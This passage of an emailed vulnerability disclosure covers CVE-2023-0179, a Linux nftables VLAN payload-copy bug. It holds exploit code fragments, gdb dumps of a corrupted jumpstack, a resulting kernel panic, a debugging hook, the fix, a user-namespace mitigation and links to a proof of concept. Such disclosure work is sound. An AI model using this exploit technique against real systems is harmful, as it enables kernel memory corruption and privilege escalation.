+                    ethlen -=3D offset + len - VLAN_ETH_HLEN + vlan_hlen;
+                    if (ethlen > 250 && vlan_hlen =3D=3D 4 && len % 4 =3D=
+=3D 0) {
+                        if (create_final_chain_rule(nl, table_name,
+final_chain_name, NFPROTO_IPV4, NULL, &seq, offset, len)) {
+                            perror("Failed creating base chain rule");
+                            //exit(EXIT_FAILURE);
+                        } else {
+                            printf("offset: %hhu & len: %hhu & ethlen =3D
+%hhu\n", offset, len, ethlen);
+                            puts("[+] Successfully created final chain
+rule!");
+                            return 0;
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+```
+
+Here is the jumpstack before evaluating the last chain:
+```
+gef=E2=9E=A4  p stackptr
+$349 =3D 0x8
+gef=E2=9E=A4  p jumpstack
+$350 =3D {{
+    chain =3D 0xffff8880050d5a50,
+    rule =3D 0xffff888006a471e8,
+    last_rule =3D 0xffff888006a471e8
+  }, {
+    chain =3D 0xffff888004eaa180,
+    rule =3D 0xffff8880045fd270,
+    last_rule =3D 0xffff8880045fd270
+  }, {
+    chain =3D 0xffff888004eaa580,
+    rule =3D 0xffff8880045fd3f0,
+    last_rule =3D 0xffff8880045fd3f0
+  }, {
+    chain =3D 0xffff888004eaa500,
+    rule =3D 0xffff8880045fde70,
+    last_rule =3D 0xffff8880045fde70
+  }, {
+    chain =3D 0xffff888004eaa080,
+    rule =3D 0xffff8880045fd690,
+    last_rule =3D 0xffff8880045fd690
+  }, {
+    chain =3D 0xffff888004eaa000,
+    rule =3D 0xffff8880045fd0f0,
+    last_rule =3D 0xffff8880045fd0f0
+  }, {
+    chain =3D 0xffff888004eaae00,
+    rule =3D 0xffff8880045fd6f0,
+    last_rule =3D 0xffff8880045fd6f0
+  }, {
+    chain =3D 0xffff888004eaad00,
+    rule =3D 0xffff8880045fd030,
+    last_rule =3D 0xffff8880045fd030
+  }, {
+    chain =3D 0xffff88807dd32680,
+    rule =3D 0x0 <fixed_percpu_data>,
+    last_rule =3D 0xffff88807dd32680
+  }, {
+...
+```
+
+and this is the jumpstack after the last chain:
+```
+gef=E2=9E=A4  p jumpstack
+$351 =3D {{
+    chain =3D 0x105cd95f8c5b7d27,
+    rule =3D 0x8ffff888005154a,
+    last_rule =3D 0x50ffff8880051548
+  }, {
+    chain =3D 0x40ffffc900000e09,
+    rule =3D 0x60ffff888005154a,
+    last_rule =3D 0x50ffffc900000e0b
+  }, {
+    chain =3D 0xc2ffffc900000e0b,
+    rule =3D 0x1ffffffff81d6cd,
+    last_rule =3D 0x8800000001000000
+  }, {
+    chain =3D 0x50ffff8880048fdd,
+    rule =3D 0x1ffff8880050d5a,
+    last_rule =3D 0x9010000
+  }, {
+    chain =3D 0x40ffff888004eaa1,
+    rule =3D 0xffff888005154a,
+    last_rule =3D 0xa0ffffffff8203c4
+  }, {
+    chain =3D 0x7dffffc900000e09,
+    rule =3D 0xffffffff8114c2,
+    last_rule =3D 0xc300000001000000
+  }, {
+    chain =3D 0x0 <fixed_percpu_data>,
+    rule =3D 0xffffff8880000000,
+    last_rule =3D 0xffffff
+  }, {
+    chain =3D 0x41ffff888004eaa1,
+    rule =3D 0x4242424242424242,     <=3D=3D=3D=3D=3D (0)
+    last_rule =3D 0x4343434343434343
+  }, {
+    chain =3D 0x4141414141414141,
+    rule =3D 0x4141414141414141,
+    last_rule =3D 0x4141414141414141
+...
+```
+Notice how the rule at (0) will be evaluated next, leading to the following
+panic:
+```
+[  787.620249] general protection fault, probably for non-canonical address
+0x4242424242424242: 0000 [#1] PREEMPT SMP NOPTI
+[  787.620249] CPU: 1 PID: 0 Comm: swapper/1 Not tainted 6.2.0-rc1 #5
+[  787.620249] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
+1.15.0-1 04/01/2014
+[  787.620249] RIP: 0010:nft_do_chain+0xc1/0x740
+[  787.620249] Code: 40 08 48 8b 38 4c 8d 60 08 4c 01 e7 48 89 bd c8 fd ff
+ff c7 85 00 fe ff ff ff ff ff ff 4c 3b a5 c8 fd ff ff 0f 83 4
+[  787.620249] RSP: 0018:ffffc900000e08f0 EFLAGS: 00000297
+[  787.688284] RAX: 4343434343434343 RBX: 0000000000000007 RCX:
+0000000000000000
+[  787.688284] RDX: 00000000ffffffff RSI: ffff888005154a38 RDI:
+ffffc900000e0960
+[  787.688284] RBP: ffffc900000e0b50 R08: ffffc900000e0950 R09:
+0000000000000009
+[  787.688284] R10: 0000000000000017 R11: 0000000000000009 R12:
+4242424242424242
+[  787.688284] R13: ffffc900000e0950 R14: ffff888005154a40 R15:
+ffffc900000e0b60
+[  787.688284] FS:  0000000000000000(0000) GS:ffff88807dd00000(0000)
+knlGS:0000000000000000
+[  787.688284] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  787.688284] CR2: 00007fd014cc05c8 CR3: 0000000004782000 CR4:
+00000000000006e0
+[  787.688284] Call Trace:
+[  787.688284]  <IRQ>
+[  787.688284]  ? _raw_spin_trylock+0x40/0x70
+[  787.688284]  ? __wake_up_common_lock+0x8d/0xc0
+[  787.688284]  ? debug_smp_processor_id+0x1b/0x30
+[  787.688284]  ? get_nohz_timer_target+0x12e/0x230
+[  787.688284]  ? lock_timer_base+0x3b/0xd0
+[  787.688284]  ? debug_smp_processor_id+0x1b/0x30
+[  787.688284]  ? __this_cpu_preempt_check+0x17/0x20
+[  787.688284]  ? __mod_memcg_lruvec_state+0x98/0x140
+[  787.688284]  ? __mod_node_page_state+0x8b/0x100
+[  787.688284]  nft_do_chain_ipv4+0x6a/0x90
+[  787.688284]  nf_hook_slow+0x48/0xc0
+[  787.688284]  nf_hook_slow_list+0x75/0x100
+[  787.688284]  ip_sublist_rcv+0x1ec/0x210
+[  787.688284]  ? __pfx_ip_rcv_finish+0x10/0x10
+[  787.688284]  ip_list_rcv+0xfd/0x130
+[  787.688284]  __netif_receive_skb_list_core+0x218/0x240
+[  787.688284]  netif_receive_skb_list_internal+0x19b/0x2b0
+[  787.688284]  napi_complete_done+0x7e/0x1d0
+[  787.688284]  e1000_clean+0x293/0x620
+[  787.688284]  __napi_poll+0x33/0x190
+[  787.688284]  net_rx_action+0x1a3/0x300
+[  787.688284]  __do_softirq+0x107/0x365
+[  787.688284]  __irq_exit_rcu+0x9f/0x110
+[  787.688284]  irq_exit_rcu+0x12/0x20
+[  787.688284]  common_interrupt+0xca/0xf0
+[  787.688284]  </IRQ>
+[  787.688284]  <TASK>
+[  787.688284]  asm_common_interrupt+0x2b/0x40
+[  787.688284] RIP: 0010:native_safe_halt+0xf/0x20
+[  787.688284] Code: ff ff 66 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 75 20 0
+[  787.688284] RSP: 0018:ffffc900000a3e88 EFLAGS: 00000246
+[  787.688284] RAX: 000000000001ad40 RBX: 0000000000000001 RCX:
+0000000000000000
+[  787.688284] RDX: 4000000000000000 RSI: ffffffff8290de15 RDI:
+0000000000013ed4
+[  787.688284] RBP: ffffc900000a3e90 R08: 0000000473333333 R09:
+0000000000000007
+[  787.688284] R10: 0000000000000000 R11: 0000000000000000 R12:
+ffff8880046b4800
+[  787.688284] R13: 0000000000000000 R14: 0000000000000000 R15:
+0000000000000000
+[  787.688284]  ? amd_e400_idle+0x46/0x50
+[  787.688284]  arch_cpu_idle+0x19/0x20
+[  787.688284]  default_idle_call+0x3f/0x100
+[  787.688284]  do_idle+0x227/0x2a0
+[  787.688284]  cpu_startup_entry+0x24/0x30
+[  787.688284]  start_secondary+0x124/0x160
+[  787.688284]  secondary_startup_64_no_verify+0xe5/0xeb
+[  787.688284]  </TASK>
+[  787.688284] Modules linked in:
+[  787.758580] ---[ end trace 0000000000000000 ]---
+[  787.758580] RIP: 0010:nft_do_chain+0xc1/0x740
+[  787.758580] Code: 40 08 48 8b 38 4c 8d 60 08 4c 01 e7 48 89 bd c8 fd ff
+ff c7 85 00 fe ff ff ff ff ff ff 4c 3b a5 c8 fd ff ff 0f 83 4
+[  787.758580] RSP: 0018:ffffc900000e08f0 EFLAGS: 00000297
+[  787.758580] RAX: 4343434343434343 RBX: 0000000000000007 RCX:
+0000000000000000
+[  787.758580] RDX: 00000000ffffffff RSI: ffff888005154a38 RDI:
+ffffc900000e0960
+[  787.758580] RBP: ffffc900000e0b50 R08: ffffc900000e0950 R09:
+0000000000000009
+[  787.758580] R10: 0000000000000017 R11: 0000000000000009 R12:
+4242424242424242
+[  787.758580] R13: ffffc900000e0950 R14: ffff888005154a40 R15:
+ffffc900000e0b60
+[  787.758580] FS:  0000000000000000(0000) GS:ffff88807dd00000(0000)
+knlGS:0000000000000000
+[  787.758580] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  787.758580] CR2: 00007fd014cc05c8 CR3: 0000000004782000 CR4:
+00000000000006e0
+[  787.758580] Kernel panic - not syncing: Fatal exception in interrupt
+[  787.758580] Kernel Offset: disabled
+[  787.758580] ---[ end Kernel panic - not syncing: Fatal exception in
+interrupt ]---
+```
+
+For debugging purposes, the VLAN tag can be manually set with the following
+gdb hook after breaking at nft_payload_eval:
+```
+gef=E2=9E=A4 define hook-vlan
+set var skb->vlan_proto=3D0x81
+set var skb->vlan_tci=3D0x12
+set var skb->protocol=3D0x81
+end
+```
+
+## Patch
+
+Since the vulnerable operation in nft_payload_copy_vlan should account for
+the encapsulated VLAN tag, I suspect that the last plus sign should have
+been a minus since it prevents any wrapping.
+I, therefore, proposed the following patch, which has been applied in
+commit 696e1a48b1a1:
+
+```diff
+static bool
+nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len)
+{
+    ...
+    if (offset + len > VLAN_ETH_HLEN + vlan_hlen)
+-        ethlen -=3D offset + len - VLAN_ETH_HLEN + vlan_hlen;
++        ethlen -=3D offset + len - VLAN_ETH_HLEN - vlan_hlen;
+    ...
+}
+```
+
+## Mitigating the bug
+
+If you are unable to patch this bug, disabling unprivileged user namespaces
+will prevent exploitation:
+
+```
+sysctl -w kernel.unprivileged_userns_clone =3D 0
+```
+
+I will be providing the full Proof of Concept on my Github repo in the next
+few days.
+
+## References
+
+Proof of Concept: [
+https://github.com/TurtleARM/CVE-2023-0179-PoC](https://github.com/TurtleAR=
+M/CVE-2023-0179-PoC)
+David Bouman's article on Nftables and his PoC on Github, which my code is
+heavily based on:
+[
+https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015=
+-1016/](https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2=
+022-1015-1016/)
+[
+https://github.com/pqlx/CVE-2022-1015](https://github.com/pqlx/CVE-2022-101=
+5)
+
+Davide Ornaghi
+
+--000000000000a1d8b605f226cde1--
